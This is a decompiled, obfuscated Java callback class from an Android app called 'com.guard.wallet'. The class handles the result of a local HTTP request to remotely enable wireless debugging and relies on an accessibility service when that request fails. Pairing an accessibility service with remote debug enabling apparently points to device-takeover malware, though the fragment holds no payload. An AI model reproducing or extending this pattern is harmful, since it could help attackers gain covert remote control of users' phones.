package com.guard.wallet.http;

import android.util.Log;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.IOException;
import p0.f0;
import p0.j0;
import p0.l0;

public final class r implements p0.e {
   @Override
   public final void b(p0.e0 var1, IOException var2) {
      a1.q.s("OpenWifiDebugCallback", var2);
      if (!(var2 instanceof s.b)) {
         if (!a1.q.B(var1.c.a.h)) {
            f0 var3 = var1.c;
            i.c(var3.a.h);
            if (var3.a.h.contains("127.0.0.1:7911")) {
               l.m("http://127.0.0.1:7912");
            } else if (h.e.S() != null) {
               h.e var4 = h.e.S();
               Log.d("AdbConnectionManager", "未配对、无障碍服务监听窗口初始化未完成,无法请求远程开启无线调试");
               if (MyAccessibilityService.P() == null) {
                  com.guard.wallet.utils.b.e();
               } else {
                  var4.U();
               }
            }
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void d(p0.e0 var1, j0 var2) {
      f0 var10 = var1.c;
      i.c(var10.a.h);
      l0 var3 = var2.g;
      label60:
      if (var3 != null) {
         Exception var10000;
         label62: {
            try {
               OpenWifiDebugCallback$1 var4 = new OpenWifiDebugCallback$1();
               var13 = (ApiResult)com.guard.wallet.utils.h.c(var3.z(), var4);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var10001 = false;
               break label62;
            }

            if (var13 != null) {
               try {
                  if (var13.getSuccess() && (Boolean)var13.getData()) {
                     Log.d("OpenWifiDebugCallback", "开启无线调试成功");
                     break label60;
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var14 = false;
                  break label62;
               }
            }

            try {
               if (!a1.q.B(var10.a.h) && var10.a.h.contains("127.0.0.1:7911")) {
                  l.m("http://127.0.0.1:7912");
                  break label60;
               }
            } catch (Exception var6) {
               var10000 = var6;
               boolean var15 = false;
               break label62;
            }

            try {
               if (h.e.S() == null) {
                  break label60;
               }

               var11 = h.e.S();
               Log.d("AdbConnectionManager", "未配对、无障碍服务监听窗口初始化未完成,无法请求远程开启无线调试");
               if (MyAccessibilityService.P() == null) {
                  com.guard.wallet.utils.b.e();
                  break label60;
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var16 = false;
               break label62;
            }

            try {
               var11.U();
               break label60;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var17 = false;
            }
         }

         Exception var12 = var10000;
         a1.q.s("OpenWifiDebugCallback", var12);
      }

      var2.close();
   }
}
